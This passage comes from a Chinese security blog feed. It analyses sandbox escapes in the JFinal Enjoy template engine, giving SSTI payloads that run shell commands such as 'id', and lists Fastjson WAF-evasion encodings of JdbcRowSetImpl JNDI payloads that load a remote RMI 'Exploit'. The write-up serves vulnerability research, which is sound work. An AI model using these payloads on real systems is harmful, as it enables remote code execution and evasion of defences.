src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/13.png"></p><p>在最终做完这些处理后，tokenList成了这个样子</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/14.png"></p><p>接下来我们看看下面，首先initPeek会将peek设置为tokenList当中的第一个，之后默认会调用<code>exprList</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Expr <span class="title">parse</span><span class="params">(<span class="keyword">boolean</span> isExprList)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.tokenList = (<span class="keyword">new</span> ExprLexer(<span class="keyword">this</span>.paraToken, <span class="keyword">this</span>.location)).scan();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.tokenList.size() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ExprList.NULL_EXPR_LIST;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.tokenList.add(EOF);</span><br><span class="line">        <span class="keyword">this</span>.initPeek();</span><br><span class="line">        Expr expr = isExprList ? <span class="keyword">this</span>.exprList() : <span class="keyword">this</span>.forCtrl();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.peek() != EOF) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ParseException(<span class="string">&quot;Expression error: can not match \&quot;&quot;</span> + <span class="keyword">this</span>.peek().value() + <span class="string">&quot;\&quot;&quot;</span>, <span class="keyword">this</span>.location);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Expr)expr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在exprList,具体的过程也比较复杂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ExprList <span class="title">exprList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ArrayList exprList = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            Expr expr = <span class="keyword">this</span>.expr();</span><br><span class="line">            <span class="keyword">if</span> (expr == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            exprList.add(expr);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.peek().sym != Sym.COMMA) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.move();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.peek() == EOF) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseException(<span class="string">&quot;Expression error: can not match the char of comma &#x27;,&#x27;&quot;</span>, <span class="keyword">this</span>.location);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ExprList(exprList);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里放一个调用栈就好了，有兴趣可以自己跟一跟(它规定了以什么样的顺序去解析我们的表达式)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">staticMember:<span class="number">326</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">incDec:<span class="number">287</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">unary:<span class="number">279</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">nullSafe:<span class="number">253</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">mulDivMod:<span class="number">241</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">addSub:<span class="number">229</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">greaterLess:<span class="number">216</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">equalNotEqual:<span class="number">203</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">and:<span class="number">191</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">or:<span class="number">179</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">ternary:<span class="number">165</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">assign:<span class="number">158</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">expr:<span class="number">127</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">exprList:<span class="number">110</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">parse:<span class="number">97</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">parseExprList:<span class="number">76</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">parseExprList:<span class="number">269</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">stat:<span class="number">117</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">statList:<span class="number">87</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">parse:<span class="number">77</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">buildTemplateBySource:<span class="number">305</span>, Engine (com.jfinal.template)</span><br><span class="line">getTemplateByString:<span class="number">242</span>, Engine (com.jfinal.template)</span><br><span class="line">getTemplateByString:<span class="number">223</span>, Engine (com.jfinal.template)</span><br><span class="line">main:<span class="number">50</span>, Test (com.example.ezsb)</span><br></pre></td></tr></table></figure><p>最终在staticMember会返回一个实例化的staticMember对象<img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/15.png"></p><p>在初始化的时候还会检查类名与方法名是否在黑名单当中，具体的在上面提到过就不贴了<a href="#方法调用">点我直达</a><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/16.png"></p><p>后面过程就省略了，已经到了我们想要的了，后面就是如何调用这个静态函数了，当然其实不止能调用静态方法，还可以直接调用实例对象的方法，但是也是有黑名单拦截</p><h2 id="绕过Bypass"><a href="#绕过Bypass" class="headerlink" title="绕过Bypass"></a>绕过Bypass</h2><p>根据之前的调试我们知道，如果想要在模板里面执行函数有几个条件</p><ul><li>对于调用静态方法，只能调用公共静态方法(但不能用黑名单当中的类以及方法)</li><li>对于实例对象的方法，只能调用public修饰的(但不能用黑名单当中的类以及方法)</li></ul><p>绕过第一个方式直接命令执行比较难，那么如果是第二种方式的话那我们肯定需要获取一个类的实例，那么有没有一个public类的静态方法能返回我们任意的实例呢，那就看看有没有办法能够返回一个类的实例呢？这样就可以 javax.script.ScriptEngineManager来执行任意Java代码(这样也比较好绕过黑名单了)</p><p>首先网上搜了搜jfinal的历史，发现可以通过fastjson去实例化一个类，同时可以开启autotype，构造payload长这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())</span><br><span class="line">#(x.setAutoTypeSupport(<span class="keyword">true</span>))</span><br><span class="line">#(x.addAccept(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>))</span><br><span class="line">#set(a=com.alibaba.fastjson.JSON::parse(<span class="string">&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;</span>))</span><br><span class="line">#set(b=a.getEngineByName(<span class="string">&#x27;js&#x27;</span>))</span><br><span class="line">#set(payload=xxxxxx)</span><br><span class="line">#(b.eval(payload))</span><br></pre></td></tr></table></figure><p>既然这样那有没有jre当中的类可以实现类似的效果呢？答案是有</p><h3 id="Java自带类绕过"><a href="#Java自带类绕过" class="headerlink" title="Java自带类绕过"></a>Java自带类绕过</h3><p>我发现有一个类<code>java.beans.Beans</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">instantiate</span><span class="params">(ClassLoader cls, String beanName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Beans.instantiate(cls, beanName, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法又臭又长，不过好在符合条件classLoader也不需要传，真舒服呀</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cls == <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    cls = ClassLoader.getSystemClassLoader();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SecurityException ex) &#123;</span><br><span class="line">    <span class="comment">// We&#x27;re not allowed to access the system class loader.</span></span><br><span class="line">    <span class="comment">// Drop through.</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/17.png"></p><p>因此配合这个类顺手拿下模板SSTI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set((java.beans.Beans::instantiate(<span class="keyword">null</span>,<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)).getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\&quot;open -na Calculator\&quot;)&quot;</span>))</span><br></pre></td></tr></table></figure><h2 id="获取回显"><a href="#获取回显" class="headerlink" title="获取回显"></a>获取回显</h2><p>我们考虑两个场景，一个是直接执行，另一个return返回值</p><h3 id="写入内存马"><a href="#写入内存马" class="headerlink" title="写入内存马"></a>写入内存马</h3><p>既然能够执行任意代码了那肯定拿下内存马，这里启一个springboot环境测试，简单测试下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">abc</span><span class="params">(<span class="meta">@RequestParam(&quot;base&quot;)</span> String base)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">  ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">  Engine engine = Engine.use();</span><br><span class="line">  engine.setDevMode(<span class="keyword">true</span>);</span><br><span class="line">  engine.setToClassPathSourceFactory();</span><br><span class="line">  Template template = engine.getTemplateByString(base);</span><br><span class="line">  String result = template.renderToString();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/18.png"></p><h3 id="直接回显"><a href="#直接回显" class="headerlink" title="直接回显"></a>直接回显</h3><p>很简单不需要讲了都，很常规payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base=#((java.beans.Beans::instantiate(<span class="keyword">null</span>,<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)).getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;var s = [3];s[0] = \&quot;/bin/bash\&quot;;s[1] =\&quot;-c\&quot;;s[2] = \&quot;id\&quot;;var p =java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\&quot;GBK\&quot;).useDelimiter(\&quot;\\A\&quot;);var result = sc.hasNext() ? sc.next() : \&quot;\&quot;;sc.close();result;&quot;</span>))</span><br></pre></td></tr></table></figure><p>测试下</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/19.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Enjoy模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我与RuoYi的攻防史</title>
      <link href="/2022/04/13/year/2022/4/%E6%88%91%E4%B8%8ERuoYi%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/"/>
      <url>/2022/04/13/year/2022/4/%E6%88%91%E4%B8%8ERuoYi%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="e690d6852cf74c0b5f3f8a97fac38bbf06e0ab789935a4081a88aab22d6794d4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> RuoYi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Fastjson绕waf</title>
      <link href="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/"/>
      <url>/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅谈Fastjson绕waf"><a href="#浅谈Fastjson绕waf" class="headerlink" title="浅谈Fastjson绕waf"></a>浅谈Fastjson绕waf</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    关键时期换个口味，虽然是炒陈饭，但个人认为有干货的慢慢看，从最简单到一些个人认为比较骚的，本人垃圾代码狗，没有实战经验，因而更多是从fastjson的词法解析部分构造混淆</p><h2 id="初级篇"><a href="#初级篇" class="headerlink" title="初级篇"></a>初级篇</h2><h3 id="添加空白字符"><a href="#添加空白字符" class="headerlink" title="添加空白字符"></a>添加空白字符</h3><p>在<code>com.alibaba.fastjson.parser.JSONLexerBase#skipWhitespace</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">skipWhitespace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="keyword">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="keyword">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="keyword">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="keyword">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="keyword">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">this</span>.next();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">this</span>.skipComment();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不难看出默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，作为开胃菜</p><h3 id="默认开启的Feature中得到的思路"><a href="#默认开启的Feature中得到的思路" class="headerlink" title="默认开启的Feature中得到的思路"></a>默认开启的Feature中得到的思路</h3><h4 id="添加多个逗号"><a href="#添加多个逗号" class="headerlink" title="添加多个逗号"></a>添加多个逗号</h4><p>FastJson中有个默认的Feature是开启的<code>AllowArbitraryCommas</code>，这允许我们用多个逗号</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e2.png"></p><p>这里可以添加的位置很多</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;,,,,,,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,,,,,,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,,,,,, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="json字段名不被引号包括"><a href="#json字段名不被引号包括" class="headerlink" title="json字段名不被引号包括"></a>json字段名不被引号包括</h4><p>也是一个默认开启的Feature，<code>AllowUnQuotedFieldNames</code>，但是只在恢复字段的过程调用当中有效果</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e4.png"></p><p>因此原来的payload可以做此改造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">||</span><br><span class="line">\/</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,dataSourceName:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="json字段名使⽤单引号包裹"><a href="#json字段名使⽤单引号包裹" class="headerlink" title="json字段名使⽤单引号包裹"></a>json字段名使⽤单引号包裹</h4><p><code>Feature.AllowSingleQuote</code>也是默认开启滴，这个太简单了就不说了</p><h4 id="type后的值第一个引号可以替换为其他字符"><a href="#type后的值第一个引号可以替换为其他字符" class="headerlink" title="@type后的值第一个引号可以替换为其他字符"></a>@type后的值第一个引号可以替换为其他字符</h4><p>主要是一个逻辑问题</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e3.png"></p><p>这里我们可以对比之前获取<code>@type</code>的过程，先检验了当前位置是<code>&quot;</code>再扫描到下一个<code>&quot;</code>之间的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">  key = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">  lexer.skipWhitespace();</span><br><span class="line">  ch = lexer.getCurrent();</span><br><span class="line"><span class="comment">//省略不必要代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以构造出,注意<code>com</code>前面的引号被我改了,<code>&#123;&quot;@type&quot;:xcom.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</code></p><h3 id="编码绕过-Unicode-Hex"><a href="#编码绕过-Unicode-Hex" class="headerlink" title="编码绕过(Unicode/Hex)"></a>编码绕过(Unicode/Hex)</h3><p>首先在<code>com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol</code>,当中可以看见，如果遇到了<code>\u</code>或者<code>\x会有解码操作</code></p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e1.png"></p><p>还可以混合编码，这里一步到位</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;\x40\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="对字段添加多个下划线或者减号"><a href="#对字段添加多个下划线或者减号" class="headerlink" title="对字段添加多个下划线或者减号"></a>对字段添加多个下划线或者减号</h3><h4 id="1-2-36版本前"><a href="#1-2-36版本前" class="headerlink" title="1.2.36版本前"></a>1.2.36版本前</h4><p>在<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code></p><p>解析字段的key的时候，调用了<code>smartMatch</code>，下面截了与本主题相关的关键点</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e5.png"></p><p>由于这里有<code>break</code>，不支持两个一起混合使用，只能单一使用其中一个，随便加</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,&#x27;d_a_t_aSourceName&#x27;:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-36版本及以后"><a href="#1-2-36版本及以后" class="headerlink" title="1.2.36版本及以后"></a>1.2.36版本及以后</h4><p>我们再来看这个<code>smartMatch</code>调用了<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64_lower</code></p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e6.png"></p><p>这个函数忽略所有的<code>_</code>与<code>-</code></p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e7.png"></p><p>因此简单测试，lol</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e8.png"></p><h3 id="1-2-36版本后可以对属性前添加is"><a href="#1-2-36版本后可以对属性前添加is" class="headerlink" title="1.2.36版本后可以对属性前添加is"></a>1.2.36版本后可以对属性前添加is</h3><p>在那个基础上,还是在<code>smartMatch</code>当中可以看见，如果前缀有<code>is</code>，会去掉<code>is</code></p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/e9.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;a&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;b&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;isdataSourceName&quot;</span>: <span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="string">&quot;isautoCommit&quot;</span>: <span class="keyword">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="高级篇"><a href="#高级篇" class="headerlink" title="高级篇"></a>高级篇</h2><p>自己瞎想出来的哈哈哈，假装很高级吧</p><h3 id="注释加强版绕过"><a href="#注释加强版绕过" class="headerlink" title="注释加强版绕过"></a>注释加强版绕过</h3><p>我在想如果假如有waf逻辑会为了方便先将接受到的字符串的去除注释符之间的部分再去匹配，比如下面的伪代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;(/\*(.*?)\*/)&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;/*y4tacker*/&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>处理前：<code>/*y4tacker*/&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code></p><p>处理后会显得更干脆更好做判断：</p><p><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</code></p><p>那有没有办法可以让我们将注释符中内容替换以后，没有危险字符嘞，当然有的，先给出答案再解释加上<code>\u001a</code></p><p><code>/*\u001a&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, 